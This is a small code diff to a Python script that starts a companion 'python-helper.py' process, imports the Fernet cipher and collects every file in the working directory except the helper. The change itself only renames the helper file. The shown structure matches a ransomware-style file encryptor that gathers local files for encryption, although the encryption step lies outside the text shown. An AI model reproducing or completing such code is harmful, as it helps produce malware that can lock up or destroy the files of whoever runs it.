@@ -1,6 +1,6 @@
 import time
 from subprocess import call
-call(["python", "python-helper"])
+call(["python", "python-helper.py"])
 
 import os
 from cryptography.fernet import Fernet
@@ -9,7 +9,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "python-helper":
+	if file == "python-helper.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
